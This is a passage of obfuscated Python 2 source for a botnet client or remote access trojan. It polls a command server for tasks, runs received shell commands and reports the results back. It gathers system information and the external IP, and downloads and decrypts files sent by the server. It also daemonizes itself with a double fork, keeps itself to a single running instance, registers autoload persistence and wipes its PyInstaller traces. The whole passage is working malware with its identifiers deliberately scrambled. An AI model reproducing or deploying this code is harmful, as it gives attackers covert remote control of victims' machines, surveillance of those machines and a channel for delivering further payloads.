			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['exe_path']=sys_executable
		except Exception as e:
			pass
		try:
			networkHandleKlass=NetworkHandlerKlass()
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['ext_ip']=networkHandleKlass.get_ip()
		except Exception as e:
			pass
		if v_sys_platform.startswith('win'):
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['systeminfo']=os_popen2("SYSTEMINFO")[1].read()
			except Exception as e:
				pass
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie


	def process(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=json_loads(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
		v_return_message=None
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy['service_task']==v_srv_info:
			v_return_message=self.collect_info()
		elif pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy['service_task']==v_srv_upd_setts:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQeD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy['data']
			botKlass.update_settings(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQeD)
			v_return_message=dict(status='ok',data='settings updated')
		else:
			raise NotImplementedError('service type {0} not implemented'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy['service_type']))
		return v_return_message


class pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDeQ(object):

	@staticmethod
	@contextmanager
	def cd(newdir):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQie=os_getcwd()
		os_chdir(newdir)
		try:
			yield
		finally:
			os_chdir(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQie)


	def new_file_name(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQiD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQDe=''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQDi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi.rindex('.')if '.' in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi else None
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQDi:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQiD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi[:pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQDi]
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQDe=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi[pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQDi:]
		return "{0}_copy{1}".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzQDe)


	def process(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		with self.cd(botKlass.current_dir):
			networkTask=json_loads(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
			v_return_message=None
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeQi=sys_getfilesystemencoding() or 'utf-8'
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeQD=networkTask['data'].encode(sys_getfilesystemencoding())
			if networkTask['command']==v_cmd:
				try:
					handle_command_klass=HandleCommandKlass()
					v_return_message=handle_command_klass.process(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeQD)
				except Exception as error:
					v_return_message={'status':'error','data':'Python error: {0}'.format(error)}
			elif networkTask['command']==v_upl:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=json_loads(networkTask['data'])
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeiD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy.get('files',None)
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy.get('orig_name',None)
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDizy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy.get('key')
				if os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi):
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeDQ=self.new_file_name(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi)
					for i in range(10):
						if not os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeDQ):
							pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeDQ
							break
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeDQ=self.new_file_name(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeDQ)
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeiD.sort(key=lambda k:k['part_num'])
				try:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeDi=os_path.join(botKlass.current_dir,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi)
					fd,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziQe=tempfile_mkstemp()
					with open(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziQe,'wb')as full_file:
						for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziQD in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeiD:
							time_sleep(random_randint(3,8))
							pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzieQ=NetworkHandlerKlass(url=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziQD['url'])
							pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzieQ.download_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziQD['file_name'],checksum=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziQD['checksum'])
							full_file.write(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzieD=CryptoKlass.decrypt_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDizy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziQe,out_filename=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzeDi)
					try:
						os_remove(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziQe)
					except:
						pass
					v_return_message='File uploaded: {0} total_size: {1}'.format(os_path.abspath(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzieD),os_path.getsize(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzieD))
					v_return_message={'status':'ok','command':v_upl,'data':v_return_message}
				except IOError as err:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDey="Error when downloading file: {0}\n".format(os_path.abspath(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi))
					if err.errno==errno_eacces:
						v_return_message=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDey+"cannot write to file"
						v_return_message={'status':'ok','command':v_upl,'data':v_return_message}
					else:
						v_return_message=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDey+"Unknown error"
						v_return_message={'status':'ok','command':v_upl,'data':v_return_message}
			elif networkTask['command']==v_srv:
				try:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziDQ=BotGetInfoKlass()
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyziDQ.process(networkTask['data'])
					v_return_message={'status':'ok','command':v_srv,'data':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie}
				except Exception as e:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDey="Error when process service task: {0}".format(e)
					v_return_message={'status':'error','command':v_srv,'data':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDey}
		return v_return_message


class pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQiDy(threading_thread):

	def __init__(self,taskID,taskData,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		self.task_id=taskID
		self.task_data=taskData
		self.on_complete=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('on_complete',None)
		self.network_handler=NetworkHandlerKlass()
		threading_thread.__init__(self)
		self.processor=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDeQ()


	def __str__(self):
		return self.task_id


	@staticmethod
	def detect_encoding():
		if v_sys_platform.startswith('win'):
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDei="{0}".format(ctypes.windll.kernel32.GetOEMCP())
		else:
			if sys_stdout.encoding:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDei=sys_stdout.encoding
			elif sys_stderr.encoding:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDei=sys_stderr.encoding
			elif sys_getfilesystemencoding():
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDei=sys_getfilesystemencoding()
			else:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDei='utf-8'
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDei


	def run(self):
		pass
		try:
			v_return_message=self.processor.process(self.task_data)
			if not v_return_message or isinstance(v_return_message,str)and not v_return_message.strip():
				v_return_message='No output provided'
			if isinstance(v_return_message,str):
				try:
					v_return_message=v_return_message.decode(self.detect_encoding()).encode('utf-8')
				except Exception as e:
					pass
					v_return_message=unicode(v_return_message,errors='replace')
				v_return_message=json_dumps({'status':'ok','command':v_cmd,'data':v_return_message})
			else:
				v_return_message=json_dumps(v_return_message)
		except Exception as err:
			v_return_message="Error when executing task: {0}".format(err)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.network_handler.send_task(self.task_id,v_return_message)
		pass
		if self.on_complete:
			self.on_complete(self)


class DoingThreadStuffKlass(object):

	def __init__(self):
		self.threads={}


	def on_thread_complete(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDiQ):
		self.threads.pop(str(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDiQ))


	def put(self,taskID,taskData):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDiQ=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQiDy(taskID,taskData,on_complete=self.on_thread_complete)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDiQ.daemon=True
		self.threads[taskID]=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDiQ
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDiQ.start()


	def have_task(self,taskID):
		return taskID in self.threads


class BotInstallKlass(object):

	def __init__(self,*key_id):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDie=key_id[0]
		self.initialized=False
		if v_sys_platform.startswith('win'):
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyQzei='tmp'+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDie.lower()
		else:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyQzei='.'+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDie+'.tmp'
		self.lockfile=os_path.normpath(tempfile_gettempdir()+'/'+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyQzei)
		self.platform=v_sys_platform
		pass
		if self.platform=='win32':
			try:
				if os_path.exists(self.lockfile):
					os_unlink(self.lockfile)
				self.fd=os_open(self.lockfile,os_o_creat|os_o_excl|os_o_rdwr)
			except OSError:
				type,e,tb=sys_exc_info()
				if e.errno==13:
					pass
					sys_exit(-1)
				raise
		else:
			self.fp=open(self.lockfile,'w')
			try:
				fcntl.lockf(self.fp,fcntl.LOCK_EX|fcntl.LOCK_NB)
			except IOError:
				pass
				sys_exit(-1)
		self.initialized=True


	def __del__(self):
		if not self.initialized:
			return
		try:
			if self.platform=='win32':
				if hasattr(self,'fd'):
					os_close(self.fd)
				if hasattr(self,'lockfile'):
					os_unlink(self.lockfile)
			else:
				fcntl.lockf(self.fp,fcntl.LOCK_UN)
				if os_path.isfile(self.lockfile):
					os_unlink(self.lockfile)
		except Exception as e:
			if v_logger:
				pass


def main():
	threadStuffKlass=DoingThreadStuffKlass()
	networkHandleKlass=NetworkHandlerKlass()
	while 1:
		gc_collect() # Garbage collector
		pass
		networkTasks=networkHandleKlass.get_tasks()
		pass
		if networkTasks:
			for networkTask in networkTasks:
				taskID=networkTask.get('task_id',None)
				taskData=networkTask.get('task_data',None)
				if taskID and taskData:
					if not threadStuffKlass.have_task(taskID):
						try:
							threadStuffKlass.put(taskID,taskData)
							botKlass.reset_tick_count()
						except KeyboardInterrupt as ki:
							time_sleep(5)
							sys_exit(0)
						except Exception as e:
							pass
			time_sleep(random_randint(3,7))
		else:
			time_sleep(random_randint(*botKlass.update_interval))
			botKlass.tick_count+=1


def forkmeiamfamous():
	import os as os_unix
	os_popen2=os.popen2
	os_getpid=os.getpid
	os_mkdir=os.mkdir
	os_chdir=os.chdir
	os_unix_fork=os_unix.fork
	os_getcwd=os.getcwd
	os_path=os.path
	os_open=os.open
	os_close=os.close
	os_o_excl=os.O_EXCL
	os_unix_umask=os_unix.umask
	os_o_creat=os.O_CREAT
	os_unix_setsid=os_unix.setsid
	os_remove=os.remove
	os_unlink=os.unlink
	os_o_rdwr=os.O_RDWR
	os_chmod=os.chmod
	os_fstat=os.fstat
	try:
		if botKlass.frozen:
			attr__MEIPASS=getattr(sys,'_MEIPASS',None)
			os_chmod(attr__MEIPASS,0555)
		os_unix_forked=os_unix_fork()
		if os_unix_forked>0:
			sys_exit(0)
	except OSError,e:
		pass
	os_chdir("/")
	os_unix_setsid()
	os_unix_umask(0)
	try:
		os_unix_forked=os_unix_fork()
		if os_unix_forked>0:
			sys_exit(0)
	except OSError,e:
		pass


def seh_wrapper():
	if botKlass.frozen:
		# _MEIPASS is the partial foldername where Python libraries are stored.
		# Cleaning up these directories to remove any remnants.
		attr__MEIPASS=getattr(sys,'_MEIPASS',None)
		botKlass.add_cleanup_dir(attr__MEIPASS)
		botKlass.do_cleanup_dirs()
	if botKlass.enable_autoload and not botKlass.autoload_registered:
		botActionKlass=BotSelfActionsKlass()
		botActionKlass.register()
	try:
		main()
	except KeyboardInterrupt as ki:
		sys_exit(0)


if __name__=="__main__":
	time_sleep(botKlass.run_delay)
	if not botKlass.was_first_run:
		botKlass.was_first_run=True
	if v_sys_platform!='win32':
		forkmeiamfamous()
	me=BotInstallKlass(botKlass.key_id)

	try:
		seh_wrapper()
	except SystemExit:
		me=None
		time_sleep(1)
		sys_exit(0)
	except Exception as e:
		me=None
		time_sleep(1)
		sys_exit(0)
